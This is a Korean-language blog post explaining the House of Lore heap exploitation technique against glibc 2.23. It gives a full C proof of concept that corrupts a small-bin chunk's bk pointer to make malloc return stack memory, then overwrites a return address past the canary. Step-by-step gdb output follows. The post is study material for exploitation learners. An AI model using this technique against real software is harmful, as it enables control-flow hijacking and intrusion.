---
title: House of Lore
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, house of series]
math: true
mermaid: true
---

## Conditions

- 할당받기 원하는 영역에 fake chunk 구조를 가지고 있어야 함
- 공격자에 의해 small, large chunk 할당과 해제가 자유로워야 함
- 공격자에 의해 freed chunk의 `bk` 영역에 원하는 값을 저장할 수 있어야 함

## Exploit plan

1. 공격 대상을 찾는다.
    - fake chunk 구조를 가지는 memory 영역
    - fake chunk 구조를 저장할 수 있는 memory 영역
2. 다른 크기의 2개의 heap 영역 할당
3. 첫 번째 chunk 해제
4. 해제된 첫 번째 chunk의 `bk`영역에 원하는 영역의 주소 값 저장
5. 두 번째 chunk보다 큰 chunk를 할당
    - 해제된 small chunk를 small bin에 등록하기 위함
6. 해제된 chunk와 동일한 크기의 heap을 2개 생성
    - 두 번째 할당된 heap의 영역은 fake chunk가 저장되었던 영역으로 할당됨

## Proof of concept

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.
[ ... ]
else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;
       [ ... ]
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){

  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);

  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

`malloc()`으로 100만큼 할당한다. victim(0x804c000)

```
gdb-peda$ x/24wx 0x804c000
0x804c000:  0x00000000  0x00000069  0x00000000  0x00000000
```

stack 영역에 `fake chunk`를 만들기 위한 buffer를 확인한다.

```
stack_buffer_1 at 0xffffd58c
stack_buffer_2 at 0xffffd580
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address onsmallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corruptedin last malloc, which returning pointer to the fake chunk on stack
```

`p5`에 `malloc()`으로 1000만큼 할당한다. `free()` 시 top chunk와 병합되지 않도록 large chunk를 만든다.

```
Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x804c070
Freeing the chunk 0x804c008, it will be inserted in the unsorted bin
```

victim을 `free()` 한 후의 `heapinfo.unsortbin`에 victim이 들어간 것을 확인할 수 있다.

```
gdb-peda$ heapinfo
(0x10)     fastbin[0]: 0x0
(0x18)     fastbin[1]: 0x0
(0x20)     fastbin[2]: 0x0
(0x28)     fastbin[3]: 0x0
(0x30)     fastbin[4]: 0x0
(0x38)     fastbin[5]: 0x0
(0x40)     fastbin[6]: 0x0
(0x48)     fastbin[7]: 0x0
(0x50)     fastbin[8]: 0x0
(0x58)     fastbin[9]: 0x0
                top: 0x804c458 (size : 0x20ba8) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x804c000 (size : 0x68)
```

unsortbin victim’s `fwd`와 `bk`는 nil이라 하는데 값이 존재했다. 어차피 덮어씌워지는거라 그냥 진행했다.

```
In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: 0xf7fb67b0
victim->bk: 0xf7fb67b0
```

`p2`에 1200만큼 `malloc()` 후 `heapinfo.smallbin`에 victim이 삽입되었다.

```
gdb-peda$ heapinfo
(0x10)     fastbin[0]: 0x0
(0x18)     fastbin[1]: 0x0
(0x20)     fastbin[2]: 0x0
(0x28)     fastbin[3]: 0x0
(0x30)     fastbin[4]: 0x0
(0x38)     fastbin[5]: 0x0
(0x40)     fastbin[6]: 0x0
(0x48)     fastbin[7]: 0x0
(0x50)     fastbin[8]: 0x0
(0x58)     fastbin[9]: 0x0
                top: 0x804c910 (size : 0x206f0) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x068)  smallbin[11]: 0x804c000
```

```
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x804c460
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0xf7fb6810
victim->bk: 0xf7fb6810
Now emulating a vulnerability that can overwrite the victim->bk pointer
```

victim을 다시 한 번 `free()`하여 `bk` 영역에 `stack_buffer_1`으로 변조한다.

```
gdb-peda$ x/24wx 0x804c000
0x804c000:  0x00000000  0x00000069  0xf7fb6810  0xffffd58c <- stack_buffer_1
```

```
-------> -------- victim chunk(0x804c000) --------- 
|        |                   |                    |
|        |         fwd       | bk(stack_buffer_1) |----
|        ------------------------------------------   |
|                                                     |
|   ---------------------------------------------------
|   |
|   ----> -------- stack_buffer_1(0xffffd58c) -------
|   |     |        0x0         |         0x0        |
----|-----|  fwd(victim_chunk) | bk(stack_buffer_2) |----
    |     -------------------------------------------   |
    |                                                   |
    | ---------------------------------------------------                     
    | |
    | --> -------- stack_buffer_2(0xffffd580) ------- 
    |     |                     |                   | 
    ------| fwd(stack_buffer_1) |                   |
        -------------------------------------------
```

victim과 똑같은 size로 `malloc()`한다.

```
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
```

0x804c000 영역이 할당되었다.

```
gdb-peda$ x/24wx 0x804c000
0x804c000:  0x00000000  0x00000069  0xf7fb6810  0xffffd58c
```

다시 한 번 똑같은 size로 `malloc()`할 경우 Stack의 공간(0xffffd594)이 할당된다. jackot의 주소를 변수에 저장 후 `p4 + 40` 위치에 `memcpy()`할 경우 return address가 변조되어 jackpot이 실행된다.

```
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)
The fwd pointer of stack_buffer_2 has changed after the last malloc to 0xf7fb6810
p4 is 0xffffd594 and should be on the stack!
Nice jump d00d
```

## References

- [The House of Lore](https://www.lazenca.net/display/TEC/The+House+of+Lore)
- [The House of Lore](https://umbum.dev/434)